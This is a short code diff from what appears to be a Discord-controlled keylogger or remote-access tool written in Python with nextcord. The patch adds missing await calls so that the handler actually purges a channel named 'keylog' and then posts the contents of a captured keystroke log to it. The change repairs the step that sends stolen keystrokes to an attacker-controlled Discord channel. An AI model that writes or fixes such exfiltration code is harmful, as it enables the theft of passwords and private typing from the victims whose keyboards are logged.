@@ -430,8 +430,8 @@ async def on_ready():
             log = keylog.read()
             keylog.close()
         channel = nextcord.utils.get(category.text_channels, name="keylog")
-        channel.purge()
-        channel.send(log)
+        await channel.purge()
+        await channel.send(log)
         
 
     @tasks.loop(seconds=UPDATE_INTERVAL)
